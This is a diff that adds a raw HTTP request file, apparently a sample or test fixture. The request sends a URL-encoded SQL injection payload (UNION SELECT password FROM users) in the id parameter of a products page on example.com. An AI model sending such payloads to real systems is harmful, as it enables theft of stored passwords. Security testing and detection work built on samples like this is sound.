@@ -1,0 +1,5 @@
+GET /products?id=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1
+Host: www.example.com
+User-Agent: curl/8.5.0
+Accept: */*
+
